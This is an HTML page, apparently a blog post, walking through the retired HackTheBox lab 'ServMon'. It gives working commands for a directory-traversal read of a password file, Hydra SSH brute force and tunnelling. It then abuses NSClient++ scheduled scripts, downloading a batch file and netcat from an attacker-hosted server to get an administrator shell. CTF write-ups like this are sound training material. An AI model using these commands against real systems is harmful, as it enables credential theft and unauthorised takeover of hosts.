@@ -1,0 +1,128 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">ServMon HacktheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/servmon-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-01-12T13:54:54+00:00">January 12, 2021</time><time class="updated" datetime="2025-06-23T16:42:45+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today, we’re going to solve another Hack the box Challenge called “ServMon” and the machine is part of the retired lab, so you can connect to the machine using your HTB VPN and then start to solve the CTF. This laboratory is of an easy level. Solving this lab is not that tough if have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.</span></p>
+<p><span style="color: #000000;"><strong>Level: Easy</strong></span></p>
+<p><span style="color: #000000;">Task: find user.txt and root.txt file on the victim’s machine.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Connecting to FTP Service as Anonymous</span></li>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploiting Directory Traversal</span></li>
+<li><span style="color: #000000;">Bruteforce using Hydra</span></li>
+<li><span style="color: #000000;">SSH Login</span></li>
+<li><span style="color: #000000;">Enumerating for user flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing NSClient</span></li>
+<li><span style="color: #000000;">Snugging root.txt</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
+<p><span style="color: #000000;">Since these labs are online, therefore they have static IP. The IP of ServMon is 10.129.29.110 so let’s start with nmap port enumeration.</span></p>
+<p><span style="color: #000000;">From the given image below, we can observe that we found ports <strong>21, 22, 80, 135, 139, 445, 5666, 6699, 8443</strong> are open. This means the services like ftp, ssh, MSRP, smb etc are running in the victim’s network.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV  10.129.29.110</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1e0vUBqLNzk/X_2kzkOYfiI/AAAAAAAAs24/LS1qQKDW82wHQsG132XRwD-f0RkxSbtnACLcBGAsYHQ/s16000/1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">As it can be seen from the above nmap scan that ftp allows anonymous service. So, let’s enumerate the FTP service by connecting to it as anonymous. We have a directory called Users. Inside that directory, we found two users named <strong>Nadine</strong> and <strong>Nathan</strong>. Now let’s go inside a directory named  Nadine we have a file with txt extension named <strong>Confidential.txt</strong>. After downloading this txt file we went inside a directory named Nathan and found another file with txt extension named Notes to do.txt and we quickly downloaded this file in our terminal.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.129.29.110
+ls
+cd Users
+ls
+cd Nadine
+ls
+get Confidential.txt
+cd Nathan
+ls
+get Notes to do.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l2jZHhOytBA/X_2k777l_rI/AAAAAAAAs28/Eybfr3bDpboi_HnnDB5GC6z1lL_0dHmDwCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">After downloading both files to our terminal we logged out of FTP and decided to take a look at the files. Confidential.txt told us that a password has been left on Desktop of Nathan and notes to do.txt file asked us to complete the leftover task and told us about three services NVMS, NSClient and SharePoint. And we know that the NVMS is behind port 80 and NSClient is behind port 8443.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sojPWbuXdTM/X_2lB3RPTaI/AAAAAAAAs3A/jfsBmJoatSEXVhCn3UbuwAA5MgRxC6rpwCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">For more detail, we will be needing to start enumeration against the host machine. Therefore, we will navigate to a web browser for exploring HTTP service. On opening the webpage we get the homepage of a web application called nvms-1000.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IGTAbQs9cXU/X_2lGgcoqyI/AAAAAAAAs3E/iEZUtNfj8bEqf1j7Vemq52ZSogIqvU5xwCLcBGAsYHQ/s16000/4.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">As we were not able to get out hands on credentials in our initial enumeration. We will have to figure out a different way to get through this Authorization Login Panel of NVMS-1000.So we used the searchsploit to search for any available exploits.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit nvms</pre>
+<p><span style="color: #000000;">This gave us the Directory Traversal Exploit. Now let’s download this exploit script using the -m parameter of the searchsploit command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit -m 47774</pre>
+<p><span style="color: #000000;">Now let’s read the contents of the exploit as well understand the usage of the exploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat 47774.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-x45jsTdHFYo/X_2lLLJHvFI/AAAAAAAAs3I/IXw-5j_RVhoCipFoeahH-OuCCRuntHpDQCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">We saw that exploit told us that it is an unauthenticated directory traversal vulnerability which exists in TVT network surveillance management software-1000 version 3.4.1. NVMS listens by default on port 80.  Since we already know there is password.txt located on Desktop of Nathan so we will now try to extract the content of Password.txt using curl with its option –path-as-is so that the path provided in URL does remove any DOT segments.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://10.129.29.110/../../../../../../../../../../../../users/Nathan/Desktop/Password.txt --path-as-is</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Aw6oUddaYxI/X_2lPssGsII/AAAAAAAAs3Q/fFJbTzy7r_kpcrXUsE7IRP-4vzHoWHgegCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">We have our two users Nadine and Nathan , now our next job is to find the password for our user with the help of hydra for SSH login brute force. Here the best way to guess password is to use the password file which we found on Desktop Nathan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L users.txt -P password.txt 10.129.29.110 ssh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HzF_VpyvoBY/X_2lUtdeoBI/AAAAAAAAs3U/eW1rSf-VwQEVgnHUC45fC0fN3hJWu-SfgCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">We have a username and password, so we tried to access the SSH on the target system and we were successfully able to log in.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh nadine@10.129.29.110</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mjk25nF55lY/X_2lY8td67I/AAAAAAAAs3Y/pwbDLrr3PqQtlwMibFj_6XXbHc8jSzDVgCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">After logging in we traversed to the Desktop of the user to read the user.txt flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\Users\Nadine&gt;cd Desktop
+C:\Users\Nadine&gt;dir
+C:\Users\Nadine&gt;type user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OX8_qwdBUFg/X_2ldDFuxWI/AAAAAAAAs3c/SLdb6Glr1p0t0NiiRaMgMkP7Ss-zCfuBQCLcBGAsYHQ/s16000/10.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Now it’s time to escalate privileges on the lab. Now if we go back to Notes file we discovered during ftp login we got to know that there is NSClient on which user has worked. Next, we enumerated the user directory to look into the Program Files directory.</span></p>
+<p><span style="color: #000000;">Directory of C:\Program Files</span></p>
+<p><span style="color: #000000;">After entering Program Files we found another interesting directory named NSClient which was mentioned in Notes file we found during ftp login. Now let’s dive inside the NSClient directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\cd NSClient++
+C:\NSClient++&gt;dir</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c59qGn9yRME/X_2liTPtYoI/AAAAAAAAs3k/zylKTC77S9AvjhrDDudxtftKDqlQRgSUACLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Here we found a file with .ini extension named nsclient.ini seems like it contains some kind of text-based content which can be useful for us for moving. It may also contain some kind of password for Admin just a guess.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\NSClient++&gt;type nsclient.ini</pre>
+<p><span style="color: #000000;">And yes we found a password hash which is confirmed below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NDRVlmHeg0M/X_2lmxc5jYI/AAAAAAAAs3o/nHCypNjJurELP0wNH2Ki9o-1_kmQet1zACLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Now if we recall Nathan’s Notes to do.txt, it locks down NSClient, so the above screenshot confirms that only localhost (127.0.0.1) can access it. NSClient operates on port 8443, which is open on localhost (127.0.0.1).</span></p>
+<p><span style="color: #000000;">Since we know ssh is enabled so we can perform Local ssh tunnelling which will make our work easier. Now again we switch into Kali Linux for local tunnelling.</span></p>
+<h5><span style="color: #000000;">Execute given below command for forwarding port to the local machine.</span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -L 8443:127.0.0.1:8443 -N Nadine@10.129.29.110</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hQD1Hlxu2-A/X_2lrUBPnyI/AAAAAAAAs3w/u9NGwdKj-4Azz0105zInwYaZajBsFyaXQCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">This opens port 8443 on our localhost and we confirmed this by opening the web application in our browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mylvWxhkY9g/X_2lzBiFaFI/AAAAAAAAs34/2u6Fz79XOsMbLoiPr-hdA_BbjydUVX57gCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Thus, I login using the enumerated details in nsclinet.ini file which we found in Program Files.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PgLUNps0RKM/X_2l3tHIZcI/AAAAAAAAs38/_JWqVK5tq_cyWQcHF0A0aUX9F5MhOEMngCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Now our next job is to download netcat 64 bits for windows.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cmPUeo_h5dQ/X_2l7Tns_YI/AAAAAAAAs4E/46MUIe4eSUkwpTsomdSdBBA5FmlVh2dHACLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Then our next job is to create a batch file that will launch our <strong>netcat.exe</strong>. we will exploit through a .bat file named <strong>exploit.bat</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat exploit.bat</pre>
+<p><span style="color: #000000;">Now let’s start-up python server by using the following command to share our  exploit.bat file on target pc.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1PjtHNjvIGs/X_2l_aA_GTI/AAAAAAAAs4I/xjjvTHAwJf07y0uEP0zg8st5N_vSxOg5QCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">Next task is to upload our exploit.bat in Temp folder of our target lab and we will do this via PowerShell. Our python server is already working in the background. Now to upload .bat file target pc execute the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">PS C:\Temp&gt; iwr http://10.10.14.52:8000/exploit.bat -Outfile C:\Temp\exploit.bat</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6oNKwRp16O0/X_2mEHtopJI/AAAAAAAAs4M/LxljLoSedG0lE_0xaJR7OS88qQ_1BCSagCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">The above screenshot confirms that the exploit.bat file has reached the target machine safely.</span></p>
+<h4><span style="color: #000000;">Gaining Access to ADMIN</span></h4>
+<p><span style="color: #000000;">Next thing is to get a shell as an administrator using netcat shells so our next job is to upload netcat in the Temp folder of the target machine. To do so execute the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">PS C:\Temp&gt; iwr http://10.10.14.52:8000/nc64.exe -Outfile C:\Temp\nc.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BNk0V7UNzx0/X_2m9m_iJeI/AAAAAAAAs44/bp6C1nGzDwQ0s6w8CKENs06ssnsoSUdbwCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">And we have successfully uploaded our netcat and this confirmed from the above screenshot. Next, we will add a new section to the settings and path goes like this /settings/external scripts/scripts and now will set the key to the shell will give value to the path where our exploit.bat is located.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zerGjgHwHDE/X_2mIoafQiI/AAAAAAAAs4U/gAmEjVcxI5Qqyc8NKUpH9gmGC4rYae_6QCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">We will now repeat the process by adding a new section in scheduler and the path goes like this <strong>/settings/scheduler</strong>. Now set the key to shell and value as <strong>interval = 1m</strong> and add the changes.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8SbXdsLrQkU/X_2mNP5-_AI/AAAAAAAAs4c/i-dWLusfEdQyObu3XG4ktPWnP8zDCgKiACLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">After saving all the changes we made we will reload the web application.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hDqMzo8U0h8/X_2mTypJDLI/AAAAAAAAs4k/MnCePP7caXYXvZebuWYf6dMJr_UzBjYjwCLcBGAsYHQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">Let’s wait for the script to be executed. Boom we are in as Administrator.</span></p>
+<p><span style="color: #000000;">We now enumerate the system, inside “C:\Program Files\NSClient++&gt;” we find a file called “root.txt”. We take a look at the content of the file and find the final flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\Program Files\NSClient++&gt; type C:\Users\Administrator\Desktop\root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ilPBuh9f2bg/X_2mej7yLkI/AAAAAAAAs4s/yNhkR1W_O0skgsRbKMskHvIS8zArMh3ywCLcBGAsYHQ/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Japneet Kaur Gandhi </strong>is a Technical Writer, Researcher and Penetration Tester.<strong> Contact <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/japneet-gandhi/">Here</a></span></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
